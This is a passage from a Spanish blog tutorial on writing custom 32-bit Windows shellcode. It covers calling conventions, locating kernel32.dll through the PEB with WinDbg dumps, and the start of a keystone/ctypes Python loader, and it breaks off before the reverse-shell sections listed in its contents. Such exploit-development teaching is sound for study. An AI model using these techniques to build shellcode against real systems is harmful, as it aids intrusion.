<!DOCTYPE html>

<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="color-scheme" content="light dark">
  
  
    
  
  <meta name="description" content="My blog site.">

  <title>Creación de un shellcode personalizado de 32 Bits</title>
  <link rel="icon" type="image/png" sizes="32x32" href="https://dreamer-r3.github.io/img/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://dreamer-r3.github.io/img/favicon-16x16.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://dreamer-r3.github.io/img/apple-touch-icon.png">
  
  <style>

  /* light mode colors */
  body {
    --primary-color: #5871a2;
    --primary-pale-color: #5871a233;
    --primary-decoration-color: #5871a210;
    --bg-color: #ffffff;
    --text-color: #2f3030;
    --text-pale-color: #767676;
    --text-decoration-color: #a9a9a9;
    --highlight-mark-color: #5f75b020;

    --callout-note-color: #5871a2;
    --callout-tip-color: #268556;
    --callout-important-color: #885fc9;
    --callout-warning-color: #ab6632;
    --callout-caution-color: #c64e4e;
  }

  /* dark mode colors */
  body.dark {
    --primary-color: #6f8fd1;
    --primary-pale-color: #6f8fd166;
    --primary-decoration-color: #6f8fd112;
    --bg-color: #1c1c1c;
    --text-color: #c1c1c1;
    --text-pale-color: #848484;
    --text-decoration-color: #5f5f5f;
    --highlight-mark-color: #8296cb3b;

    --callout-note-color: #6f8fd1;
    --callout-tip-color: #47976f;
    --callout-important-color: #9776cd;
    --callout-warning-color: #ad7a52;
    --callout-caution-color: #d06161;
  }

  /* typography */
  body {
    --main-font: ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
    --code-font: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace;
    --homepage-max-width: 768px;
    --main-max-width: 768px;
    --avatar-size: 60px;
    --font-size: 16px;
    --line-height: 1.75;
    --img-border-radius: 0px;
    --detail-border-radius: 0px;
    --dark-mode-img-brightness: 0.75;
    --dark-mode-chart-brightness: 0.75;
    --inline-code-border-radius: 2px;
    --inline-code-bg-color: var(--primary-decoration-color);
    --block-code-border-radius: 0px;
    --block-code-border-color: var(--primary-color);
    --detail-border-color: var(--primary-color);
  }

</style>

  <link rel="stylesheet" href="https://dreamer-r3.github.io/main.css">
  

<link id="hl" rel="stylesheet" type="text/css" href="/hl-light.css" />



  
</head>

<body class="post">
  
  <script>
    const theme = sessionStorage.getItem('theme');
    const match = window.matchMedia("(prefers-color-scheme: dark)").matches
    if ((theme && theme == 'dark') || (!theme && match)) {
      document.body.classList.add('dark');
      const hl = document.querySelector('link#hl');
      if (hl) hl.href = 'https://dreamer-r3.github.io/hl-dark.css';
    }
  </script>
  
  
<div id="wrapper">
  <div id="blank"></div>
  <aside>
    
    
    <nav>
      <ul>
        
        <li>
          <a class="h2" href="#que-es-un-shellcode">Qué es un shellcode</a>
          
        </li>
        
        <li>
          <a class="h2" href="#convenciones-de-llamada-x86">Convenciones de llamada (x86)</a>
          
        </li>
        
        <li>
          <a class="h2" href="#problemas-derivados-de-las-llamadas-al-sistema">Problemas derivados de las llamadas al sistema</a>
          
        </li>
        
        <li>
          <a class="h2" href="#buscando-kernel32-dll">Buscando Kernel32.dll</a>
          
        </li>
        
        <li>
          <a class="h2" href="#metodo-peb">Método PEB</a>
          
        </li>
        
        <li>
          <a class="h2" href="#keystone">Keystone</a>
          
        </li>
        
        <li>
          <a class="h2" href="#resolucion-de-simbolos">Resolución de símbolos</a>
          
          <ul>
            
            <li>
              <a class="h3" href="#exportar-tabla-de-directorios">Exportar tabla de directorios</a>
            </li>
            
            <li>
              <a class="h3" href="#trabajando-con-la-matriz-de-nombres-de-exportacion">Trabajando con la matriz de nombres de exportación</a>
            </li>
            
          </ul>
          
        </li>
        
        <li>
          <a class="h2" href="#calcular-el-hash-del-nombre-de-una-funcion">Calcular el hash del nombre de una función</a>
          
          <ul>
            
            <li>
              <a class="h3" href="#obtener-vma-de-una-funcion">Obtener VMA de una función</a>
            </li>
            
          </ul>
          
        </li>
        
        <li>
          <a class="h2" href="#como-evitar-bytes-nulos">Como evitar bytes nulos</a>
          
          <ul>
            
            <li>
              <a class="h3" href="#shellcode-independiente-de-la-poisicion">Shellcode independiente de la poisición</a>
            </li>
            
          </ul>
          
        </li>
        
        <li>
          <a class="h2" href="#shell-inversa">Shell inversa</a>
          
          <ul>
            
            <li>
              <a class="h3" href="#carga-de-ws2-32-dll-y-resolucion-de-simbolos">Carga de ws2_32.dll y resolución de símbolos</a>
            </li>
            
            <li>
              <a class="h3" href="#llamada-a-wsastartup">LLamada a WSAStartup</a>
            </li>
            
            <li>
              <a class="h3" href="#llamada-a-wsasocketa">LLamada a WSASocketA</a>
            </li>
            
            <li>
              <a class="h3" href="#llamada-a-wsaconnect">LLamada a WSAConnect</a>
            </li>
            
            <li>
              <a class="h3" href="#llamada-a-createprocessa">LLamada a CreateProcessA</a>
            </li>
            
          </ul>
          
        </li>
        
        <li>
          <a class="h2" href="#referencias">Referencias</a>
          
        </li>
        
      </ul>
    </nav>
    
    
    <button id="back-to-top" aria-label="back to top">
      
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>

    </button>
    
  </aside>
  <main>
    
<header>
  <nav>
    <a id="back-link" href="https:&#x2F;&#x2F;dreamer-r3.github.io&#x2F;posts">← Back</a>
  </nav>
</header>


    <div>
      
      
      
      
      <div id="copy-cfg" style="display: none;" data-copy-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
" data-check-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
"></div>
      
      <article class="prose">
        <h1>Creación de un shellcode personalizado de 32 Bits</h1>
        <div id="post-info">
          <div id="date">
            <span id="publish">Nov 3, 2025</span>
            </div>

          
          <div id="tags">
            <a class="instant" href="https://dreamer-r3.github.io//tags/asm"><span>#</span>asm</a><a class="instant" href="https://dreamer-r3.github.io//tags/shellcoding"><span>#</span>shellcoding</a>
          </div>
          
        </div>

        
        

        

        <h2 id="que-es-un-shellcode">Qué es un shellcode<a class="zola-anchor" href="#que-es-un-shellcode" aria-label="Anchor link for: que-es-un-shellcode" style="visibility: hidden;"></a>
</h2>
<p>Un shellcode es un conjunto de Instrucciones de CPU que se ejecutan tras explotar una vulnerabilidad.</p>
<p>Dado que el shellcode generalmente se escribe en ensamblador y luego se traduce a los códigos de operación hexadecimales, se puede usar para manipular directamente los registros de la CPU y llamar a funciones del sistema.</p>
<p>Para poder llamar a una función entran en juego las convenciones de llamadas.</p>
<h2 id="convenciones-de-llamada-x86">Convenciones de llamada (x86)<a class="zola-anchor" href="#convenciones-de-llamada-x86" aria-label="Anchor link for: convenciones-de-llamada-x86" style="visibility: hidden;"></a>
</h2>
<p>Una convención de llamada x86 es un conjunto de reglas que definen cómo se pasan los parámetros a una función y cómo se devuelve un resultado en la arquitectura x86.</p>
<p>En una convención de llamada se definen:</p>
<ul>
<li>Como se pasan los argumentos a una función.</li>
<li>Qué registros debe conservar el destinatario para el que llama.</li>
<li>Cómo debe prepararse el marco de la pila antes de llamada.</li>
<li>Como debe restaurarse el marco de pila después de la llamada.</li>
</ul>
<p>Por lo tanto es fundamental saber que usar la convención de llamada correcta para la función API que se desea utilizar en el shellcode.</p>
<p>Por ejemplo:</p>
<p>Las funciones API Win32 utilizan la convención de llamada <code>__stdcall</code>, mientras que las funciones de tiempo de ejecución de C utilizan la llamada <code>__cdecl</code>.</p>
<p>En cualquier convención de llamada en un sistema de 32 bits, los registros <code>EAX, EDX y ECX</code>, se consideran volátiles lo que significa que pueden verse afectados durante la llamada de una función, por lo tanto no debemos confiar en estos registros a menos que hayamos comprobado que pueden verse afectados durante una llamada a una función.</p>
<p>Todos los demás registros se consideran no volátiles y deben ser conservados durante la ejecución de la API llamada.</p>
<h2 id="problemas-derivados-de-las-llamadas-al-sistema">Problemas derivados de las llamadas al sistema<a class="zola-anchor" href="#problemas-derivados-de-las-llamadas-al-sistema" aria-label="Anchor link for: problemas-derivados-de-las-llamadas-al-sistema" style="visibility: hidden;"></a>
</h2>
<p>La API Nativa de Windows es equivalente a la llamada del sistema en los sistemas UNIX. Es una interfaz expuesta al modo usuario por la biblioteca <code>ntdll.dll</code>, que proporciona una forma para que las aplicaciones del modo usuario puedan llamar a funciones ubicadas en el kernel de forma controlada.</p>
<p>La API nativa está oculta trás la API de nivel superior debido a la naturaleza de la arquitectura NT.</p>
<p>Las funciones a nivel de kernel suelen identificarse mediante números de llamada al sistema que se utilizan para llamar a las funciones correspondientes.</p>
<p>Es importante tener en cuenta que en Windows, estos números de llamada al sistema tienden a cambiar entre versiones principales y secundarias.</p>
<p>Sin embargo, en sistemas Linux, estas llamadas son números fijos y no cambian.</p>
<p>Por ejemplo, Windows no exporta una API de socket a través de la interfaz de llamada del sistema. Esto significa que debemos evitar las llamadas directas al sistema para escribir shellcode universal y fiable para Windows.</p>
<p>Sin llamadas al sistema, nuestra única opción para comunicarnos directamente con el kernel es usar la API de Windows, exportada por bibliotecas de vínculos dinámicos (DLL) que se asignan a la memoria del proceso en tiempo de ejecución.</p>
<p>Por lo tanto, Afortunadamente <code>kernel32.dll</code>, expone funciones que pueden usarse para poder hacer llamadas llamadas a API como por ejemplo <code>CreateProccesA</code>.</p>
<h2 id="buscando-kernel32-dll">Buscando Kernel32.dll<a class="zola-anchor" href="#buscando-kernel32-dll" aria-label="Anchor link for: buscando-kernel32-dll" style="visibility: hidden;"></a>
</h2>
<p>Como hemos mencionado, kernel32 exporta muchas funciones y tiene APIs necesarias para poder cargar DLL adicionales como <code>LoadLibrary</code> y <code>GetProcAddress</code>.</p>
<p>Para obtener una dirección base de una DLL, debemos aseegurarmos de que esté asignada al msimo espacio de memoria que nuestro shellcode en ejecucción.</p>
<p>Por suerte, <code>kernel32.dll</code> se cargará ya que exporta las APIs neceserias para la mayoría de procesos.</p>
<p>Para la creación del shellcode usaremos un método conocido como "<em>Método PEB</em>".</p>
<h2 id="metodo-peb">Método PEB<a class="zola-anchor" href="#metodo-peb" aria-label="Anchor link for: metodo-peb" style="visibility: hidden;"></a>
</h2>
<p>El Sistema operativo, asigna la estructura PEB a cada proceso en ejecución. Se puede encontrar recorriendo la memoria del proceso a partir del registros <code>FS</code>.</p>
<p>En las versiones de 32 bits de Windows, el registro <code>FS</code> siempre contiene un puntero al bloque de entorno de subproceso (TEB) actual. El TEB es una estructura de datos que almacena información sobre el subproceso en ejecución.</p>
<p>En el desplazamiento <code>0x30</code> desde el inicio del TEB, se encuentra un puntero a la estructura de datos PEB.</p>
<p>Vamos a tomar de ejemplo el Bloc de notas (<em>Notepad.exe</em>) de Windows y volcaremos la estructura del TEB:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:007&gt; dt nt!_TEB @$teb
</span><span class="z-text z-plain">ntdll!_TEB
</span><span class="z-text z-plain">   +0x000 NtTib            : _NT_TIB
</span><span class="z-text z-plain">   +0x01c EnvironmentPointer : (null) 
</span><span class="z-text z-plain">   +0x020 ClientId         : _CLIENT_ID
</span><span class="z-text z-plain">   +0x028 ActiveRpcHandle  : (null) 
</span><span class="z-text z-plain">   +0x02c ThreadLocalStoragePointer : (null) 
</span><span class="z-text z-plain">   +0x030 ProcessEnvironmentBlock : 0x02c93000 _PEB
</span></code></pre>
<p>El anterior fragmento de código muestra el puntero del PEB en el desplazamiento 0x30, podemos volcar la estructura y obtener información como el nombre de la imagen, los argumentos de inicio del proceso, etc.</p>
<pre class="z-code"><code><span class="z-text z-plain">dt nt!_PEB 0x02c93000
</span><span class="z-text z-plain">ntdll!_PEB
</span><span class="z-text z-plain">   +0x000 InheritedAddressSpace : 0 &#39;&#39;
</span><span class="z-text z-plain">   +0x001 ReadImageFileExecOptions : 0 &#39;&#39;
</span><span class="z-text z-plain">   +0x002 BeingDebugged    : 0x1 &#39;&#39;
</span><span class="z-text z-plain">   +0x003 BitField         : 0x84 &#39;&#39;
</span><span class="z-text z-plain">   +0x003 ImageUsesLargePages : 0y0
</span><span class="z-text z-plain">   +0x003 IsProtectedProcess : 0y0
</span><span class="z-text z-plain">   +0x003 IsImageDynamicallyRelocated : 0y1
</span><span class="z-text z-plain">   +0x003 SkipPatchingUser32Forwarders : 0y0
</span><span class="z-text z-plain">   +0x003 IsPackagedProcess : 0y0
</span><span class="z-text z-plain">   +0x003 IsAppContainer   : 0y0
</span><span class="z-text z-plain">   +0x003 IsProtectedProcessLight : 0y0
</span><span class="z-text z-plain">   +0x003 IsLongPathAwareProcess : 0y1
</span><span class="z-text z-plain">   +0x004 Mutant           : 0xffffffff Void
</span><span class="z-text z-plain">   +0x008 ImageBaseAddress : 0x00120000 Void
</span><span class="z-text z-plain">   +0x00c Ldr              : 0x77c61c60 _PEB_LDR_DATA
</span></code></pre>
<p>Debemos prestar especial atención en el puntero <code>_PEB_LDR_DATA</code>, que se encuentra en el desplazamiento <code>0x00c</code>, este puntero referencia las tres listas enlazadas que revelan los módulos cargados que se han mapeado en la memoria del proceso.</p>
<p>Inspeccionemos este puntero:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:007&gt; dt_PEB_LDR_DATA 0x77c61c60
</span><span class="z-text z-plain">ntdll!_PEB_LDR_DATA
</span><span class="z-text z-plain">   +0x000 Length           : 0x30
</span><span class="z-text z-plain">   +0x004 Initialized      : 0x1 &#39;&#39;
</span><span class="z-text z-plain">   +0x008 SsHandle         : (null) 
</span><span class="z-text z-plain">   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x2fb1c98 - 0x2ff4820 ]
</span><span class="z-text z-plain">   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x2fb1ca0 - 0x2ff4828 ]
</span><span class="z-text z-plain">   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x2fb1bc0 - 0x2ff5540 ]
</span><span class="z-text z-plain">   +0x024 EntryInProgress  : (null) 
</span><span class="z-text z-plain">   +0x028 ShutdownInProgress : 0 &#39;&#39;
</span><span class="z-text z-plain">   +0x02c ShutdownThreadId : (null) 
</span></code></pre>
<p>En el snippet de código anterior, diferenciamos las 3 listas:</p>
<pre class="z-code"><code><span class="z-text z-plain">   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x2fb1c98 - 0x2ff4820 ]
</span><span class="z-text z-plain">   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x2fb1ca0 - 0x2ff4828 ]
</span><span class="z-text z-plain">   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x2fb1bc0 - 0x2ff5540 ]
</span></code></pre>
<ul>
<li>
<p><strong>InLoadOrderModuleList</strong>: Muestra el módulo anterior y el siguiente según el orden de carga.</p>
</li>
<li>
<p><strong>InMemoryOrderModuleList</strong>: Muestra el múdlo anterior y el siguiente según el orden de ubicación en memoria.</p>
</li>
<li>
<p><strong>InInitializationOrderModuleList</strong>: MUestra el módulo anterior y el siguiente según el orden de inicialización.</p>
</li>
</ul>
<p>En WinDBG, <code>InInitializationOrderModuleList</code>, se muestra como una estructura compuesta por dos campos:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:007&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)0x77c61c6c))
</span><span class="z-text z-plain">(*((ntdll!_LIST_ENTRY *)0x77c61c6c))                 [Type: _LIST_ENTRY]
</span><span class="z-text z-plain">    [+0x000] Flink            : 0x2fb1c98 [Type: _LIST_ENTRY *]
</span><span class="z-text z-plain">    [+0x004] Blink            : 0x2ff4820 [Type: _LIST_ENTRY *]
</span></code></pre>
<p>Flink (siguiente) y Blink (anterior), se utilizan comúnmente en listas dobleblemente enlazadas.</p>
<p>Esto puede no parecer útil, pero la estructura <code>_lIST_ENTRY</code>, indicada en <code>_PEB_LDR_DATA</code>, está incrustada como parte de una estructura más grande del tipo: <code>_LDR_DATA_TABLE_ENTRY</code>.</p>
<p>Para poder mostrar esta estructura, debemos restar <code>0x10</code>, a la estructura <code>_LIST_ENTRY</code>, para poder llegar a <code>_LDR_DATA_TABLE_ENTRY</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:007&gt; dt _LDR_DATA_TABLE_ENTRY (0x77c61c6c - 0x10)
</span><span class="z-text z-plain">ntdll!_LDR_DATA_TABLE_ENTRY
</span><span class="z-text z-plain">   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x0 - 0x30 ]
</span><span class="z-text z-plain">   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x1 - 0x0 ]
</span><span class="z-text z-plain">   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x2fb1c98 - 0x2ff4820 ]
</span><span class="z-text z-plain">   +0x018 DllBase          : 0x02fb1ca0 Void
</span><span class="z-text z-plain">   +0x01c EntryPoint       : 0x02ff4828 Void
</span><span class="z-text z-plain">   +0x020 SizeOfImage      : 0x2fb1bc0
</span><span class="z-text z-plain">   +0x024 FullDllName      : _UNICODE_STRING &quot;&quot;
</span><span class="z-text z-plain">   +0x02c BaseDllName      : _UNICODE_STRING &quot;&quot;
</span><span class="z-text z-plain">   +0x034 FlagGroup        : [4]  &quot;???&quot;
</span><span class="z-text z-plain">   +0x034 Flags            : 2
</span></code></pre>
<p>A destacar, está el campo <code>DLLBase</code>, que contiene la dirección base de de la DLL, también podemos ver el campo <code>BaseDLLName</code>, que según WinDBG, la estructura es de tipo <code>_UNICODE_STRING</code>.</p>
<p>Según la documentación de Microsoft este tipo de estructura tiene un miembro Buffer que comienza en el desplazamiento <code>0x04</code> desde el inicio de esta estructura, el cual contiene un puntero a una cadena de caracteres.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:007&gt; dx -r1 (*((ntdll!_UNICODE_STRING *)0x77c61c88))
</span><span class="z-text z-plain">(*((ntdll!_UNICODE_STRING *)0x77c61c88))                 [Type: _UNICODE_STRING]
</span><span class="z-text z-plain">    [+0x000] Length           : 0x0 [Type: unsigned short]
</span><span class="z-text z-plain">    [+0x002] MaximumLength    : 0x0 [Type: unsigned short]
</span><span class="z-text z-plain">    [+0x004] Buffer           : 0x0 [Type: wchar_t *]
</span></code></pre>
<p>Para nosotros, esto significa que, nuestro shellcode, el nombre de la DLL comienza en el desplazamiento <code>0x30</code>, desde el inicio de la estrcutura: <code>_LDR_DATA_TABLE_ENTRY</code>.</p>
<p>Llegados a este punto, podemos analizar la lista <code>InInitializationOrderModuleList</code>, y usar el campo <code>BaseDllName</code> para encontrar el módulo deseado. Si el nombre coincide, podemos obtener la dirección base (<code>DLLBase</code>).</p>
<h2 id="keystone">Keystone<a class="zola-anchor" href="#keystone" aria-label="Anchor link for: keystone" style="visibility: hidden;"></a>
</h2>
<p>Se usará el framework keystone para ensamblar nuestro shellcode, usaremos también la biblioteca <code>ctypes</code> que nos permitirá ejecutar ese código directamente en la memoria del proceso de <code>python.exe</code> mediante varias APIs de Windows.</p>
<p>Se creará un script de python que ejecute los pasos mencionados anteriormente empleando la ténica PEB para poder recuperar la dirección base de <code>kernel32.dll</code>, que exporta funciones que necesitaremos posteriormente.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span></span><span class="z-punctuation z-separator z-import-list z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">struct</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">keystone</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-constant z-language z-import-all z-python">*</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">CODE</span></span><span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-begin z-python">(</span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">int3;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Breakpoint para WinDbg
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ebp, esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">sub esp, 60h;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ks</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">Ks</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">KS_ARCH_X86</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">KS_MODE_32</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inicializar el motor keystone en 32 bits
</span></span><span class="z-source z-python">
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">encoding</span></span>, <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">count</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ks</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">asm</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">CODE</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">print</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">Encoded <span class="z-constant z-other z-placeholder z-python">%d</span> instructions...<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">%</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">count</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">sh</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-statement z-loop z-for z-python"><span class="z-keyword z-control z-loop z-for z-python">for</span> <span class="z-meta z-generic-name z-python">e</span> <span class="z-keyword z-control z-loop z-for z-in z-python">in</span></span><span class="z-meta z-statement z-loop z-for z-python"> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">encoding</span></span></span><span class="z-meta z-statement z-loop z-for z-python"><span class="z-punctuation z-section z-block z-loop z-for z-python">:</span></span>
</span><span class="z-source z-python">	<span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">sh</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">struct</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">pack</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">B<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">e</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-type z-python">bytearray</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">sh</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ptr</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ctypes</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">windll</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">kernel32</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">VirtualAlloc</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span>
